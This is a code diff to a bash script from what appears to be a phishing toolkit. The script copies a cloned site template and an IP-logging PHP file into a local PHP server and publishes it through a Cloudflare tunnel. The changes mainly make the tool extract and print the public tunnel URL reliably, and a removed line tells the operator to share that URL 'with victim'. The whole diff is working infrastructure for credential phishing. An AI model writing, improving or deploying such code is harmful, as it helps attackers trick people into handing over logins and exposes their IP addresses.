@@ -252,9 +252,8 @@ setup_site() {
 	cp -rf .sites/"$website"/* .server/www 2>/dev/null
 	cp -f .sites/ip.php .server/www/ 2>/dev/null
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server on ${CYAN}$HOST:$PORT${BLUE}..."${WHITE}
-	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
+	php -S "$HOST":"$PORT" -t .server/www > /dev/null 2>&1 &
 	sleep 1
-	cd - > /dev/null 2>&1
 }
 
 ## Get IP address
@@ -311,26 +310,36 @@ start_cloudflared() {
 	fi
 
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared TryCloudflare tunnel..."${WHITE}
-	echo -e "\n${ORANGE}[${WHITE}*${ORANGE}]${CYAN} Cloudflared will print tunnel URL below:"
-	echo -e "${ORANGE}[${WHITE}*${ORANGE}]${CYAN} Look for line containing 'trycloudflare.com'${WHITE}\n"
-	
-	# Start cloudflared tunnel in BACKGROUND
-	# This will output the URL to stdout which user can see
+
+	# Start cloudflared tunnel in BACKGROUND, logging to a file instead of the terminal
 	# Command: cloudflared tunnel --url http://localhost:8080
-	./.server/cloudflared tunnel --url "http://$HOST:$PORT" 2>&1 &
+	local cfd_log=".server/cloudflared.log"
+	./.server/cloudflared tunnel --url "http://$HOST:$PORT" > "$cfd_log" 2>&1 &
 	local cfd_pid=$!
-	
-	# Wait a moment for cloudflared to establish tunnel and print URL
-	sleep 3
-	
-	# Check if cloudflared is still running
-	if ! kill -0 $cfd_pid 2>/dev/null; then
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} ERROR: Cloudflared failed to start"
-		echo -e "${RED}[${WHITE}!${RED}]${RED} Make sure cloudflared v2020.5.1 or later is installed"
+
+	# Poll the log for the generated URL instead of dumping cloudflared's own output
+	local tunnel_url=""
+	for i in {1..40}; do
+		if ! kill -0 $cfd_pid 2>/dev/null; then
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} ERROR: Cloudflared failed to start"
+			echo -e "${RED}[${WHITE}!${RED}]${RED} Make sure cloudflared v2020.5.1 or later is installed"
+			cat "$cfd_log" 2>/dev/null
+			{ reset_color; exit 1; }
+		fi
+		tunnel_url=$(grep -o 'https://[a-zA-Z0-9-]*\.trycloudflare\.com' "$cfd_log" 2>/dev/null | head -n1)
+		if [[ -n "$tunnel_url" ]]; then
+			break
+		fi
+		sleep 0.5
+	done
+
+	if [[ -z "$tunnel_url" ]]; then
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} ERROR: Timed out waiting for tunnel URL"
+		cat "$cfd_log" 2>/dev/null
 		{ reset_color; exit 1; }
 	fi
-	
-	echo -e "\n${GREENBG}${BLACK} Tunnel URL should appear above - copy and share with victim ${RESETBG}"
+
+	echo -e "\n${GREENBG}${BLACK} Tunnel URL: $tunnel_url ${RESETBG}"
 	echo -e "\n${ORANGE}[${WHITE}*${ORANGE}]${CYAN} Cloudflared is running in background (PID: $cfd_pid)"
 	echo -e "${ORANGE}[${WHITE}*${ORANGE}]${CYAN} PHP server listening on http://$HOST:$PORT"
 	
